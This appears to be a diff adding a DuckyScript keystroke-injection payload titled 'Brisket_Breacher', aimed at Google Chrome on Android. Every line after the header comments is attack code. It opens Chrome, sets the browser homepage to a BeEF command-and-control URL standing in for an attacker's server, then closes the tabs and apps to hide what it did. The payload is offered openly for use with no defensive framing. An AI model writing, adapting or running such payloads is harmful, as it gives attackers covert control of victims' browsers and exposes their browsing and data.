@@ -1,0 +1,81 @@
+REM TITLE: Brisket_Breacher
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Android mobile device/Google Chrome (tested on Samsung S24 FE | One UI V7.0 | Android V15)
+REM DESCRIPTION: Brisket_Breacher is DuckyScript payload that targets the Android mobile device Google Chrome browser utilizing the Browser Exploitation Framework (BeEF). It replaces the homepage of the browser with a malicious Google Search imitation homepage that connects to a control and command server, allowing the attacker to have control over the browser. See README.md
+REM REQUIREMENTS: See README.md
+
+DEFINE #BeEF_URL https://BeEF_C2_URL
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening Google Chrome:
+GUI f
+DELAY 400
+STRINGLN chrome
+DELAY 200
+ENTER
+DELAY 500
+
+REM Opening new tab to ensure proper default Chrome environment to execute payload properly:
+CTRL t
+DELAY 300
+SHIFT TAB
+DELAY 200
+ENTER
+DELAY 350
+
+REM Navigating to Homepage settings:
+REPEAT 11 DOWNARROW
+ENTER
+DELAY 350
+REPEAT 10 DOWNARROW
+ENTER
+
+REM Setting BeEF C2 URL as default homepage:
+DELAY 250
+REPEAT 4 TAB
+DELAY 250
+CTRL a
+DELAY 250
+STRINGLN #BeEF_URL
+DELAY 250
+
+REM Navigating back to original homepage and accessing tabs menu:
+ESC
+DELAY 100
+ESC
+DELAY 250
+SHIFT TAB
+DELAY 250
+DOWNARROW
+DELAY 100
+UPARROW
+DELAY 300
+ENTER
+
+REM Closing all tabs:
+DELAY 350
+REPEAT 4 TAB
+DELAY 350
+ENTER
+DELAY 350
+REPEAT 2 DOWNARROW
+DELAY 250
+ENTER
+DELAY 350
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 200
+
+REM Closing applications (including browser) and returning to home screen:
+INJECT_MOD
+GUI TAB
+DELAY 300
+REPEAT 2 DOWNARROW
+DELAY 150
+ENTER
